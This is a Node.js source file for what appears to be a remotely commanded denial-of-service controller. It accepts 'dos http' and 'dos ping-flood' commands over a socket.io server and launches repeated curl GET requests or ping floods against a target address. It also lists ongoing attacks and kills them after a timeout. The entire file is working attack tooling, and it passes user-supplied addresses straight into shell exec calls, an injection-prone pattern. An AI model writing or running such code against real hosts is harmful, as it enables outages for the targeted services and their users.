import {
  ATTACK_TIMEOUT_MS,
  DOS_HTTP_REQ_COUNT,
  DOS_PING_FLOOD_REQ_COUNT,
  ERROR,
  ERROR_MSG,
  URL_REGEX,
} from "./const.js";
import { io } from "./server.js";
import { exec } from "child_process";
import { nanoid } from "nanoid";

/* 

Valid commands:

dos http <adress>
dos ping-flood <adress>
ongoing

*/

const attacks = new Map();

export function executeCommand(command) {
  const parsed = parse(command);

  console.log("parsed command: " + parsed);

  if (parsed.length == 0) {
    io.emit("log", ERROR_MSG.UNEXISTING_COMMAND);
    return;
  }

  const action = parsed.splice(0, 1)[0];

  try {
    switch (action) {
      case "dos":
        handleOffensiveCommand(parsed);
        break;
      case "ongoing":
        getCurrentAttacks();
        break;
      default:
        io.emit("log", ERROR_MSG.UNEXISTING_COMMAND);
    }
  } catch (err) {
    if (err == ERROR.INVALID_ADDRESS) {
      io.emit("log", ERROR_MSG.INVALID_ADDRESS);
    }
    if (err == ERROR.UNEXISTING_COMMAND) {
      io.emit("log", ERROR_MSG.UNEXISTING_COMMAND);
    }
    console.log("other error: " + err);
  }
}

function parse(command) {
  command = command.trim();
  command = command.replace(/\s\s+/g, " ");
  return command.split(" ");
}

function handleOffensiveCommand(command) {
  if (command.length < 2) {
    throw ERROR.UNEXISTING_COMMAND;
  }

  const typeOfAttack = command[0];
  const address = command[1];

  console.log("type of attack: " + typeOfAttack);
  console.log("address: " + address);

  if (!isAddressValid(address)) {
    throw ERROR.INVALID_ADDRESS;
  }

  let attack;

  switch (typeOfAttack) {
    case "http":
      attack = performHttpGETDoS(address);
      break;
    case "ping-flood":
      attack = performPingFlood(address);
      break;
    default:
      throw ERROR.UNEXISTING_COMMAND;
  }

  registerAttack(attack);
}

function registerAttack(attack) {
  attack["timeout"] = setTimeout(() => {
    attacks.get(attack.id).process.kill(9);
    attacks.delete(attack.id);
    io.emit("log", "attack of id: " + attack.id + " timed out");
  }, ATTACK_TIMEOUT_MS);
  attacks.set(attack.id, attack);
}

function removeAttack(id) {
  const attack = attacks.get(id);
  if (!attack) {
    return;
  }
  clearTimeout(attack.timeout);
  attacks.delete(id);
  io.emit("log", "attack of id: " + id + " completed");
}

function isAddressValid(address) {
  if (URL_REGEX.test(address)) {
    return true;
  }

  return false;
}

function performHttpGETDoS(address) {
  const id = nanoid();
  const process = exec("curl " + (address + " ").repeat(DOS_HTTP_REQ_COUNT), function (err, stdout, stderr) {
    console.log(stdout); 
    removeAttack(id);
    io.emit("log", "attack of ID: " + id + " completed");
  });
  console.log("start sending request through curl...");
  return { id, type: "HTTP GET DoS", address, process };
}

function performPingFlood(address) {
  const id = nanoid();
  const process = exec("ping -n " + DOS_PING_FLOOD_REQ_COUNT + " " + address, function (err, stdout, stderr) {
    ////REPLACE WITH ping -c WHEN RUNNING ON LINUX
    console.log(stdout); 
    removeAttack(id);
  });
  console.log("start pinging...");
  return { id, type: "ping flood DoS", address, process };
}

function getCurrentAttacks() {
  attacks.forEach((attack) => {
    io.emit("log", "ID: " + attack.id + " Type: " + attack.type + " Address: " + attack.address);
  });
}
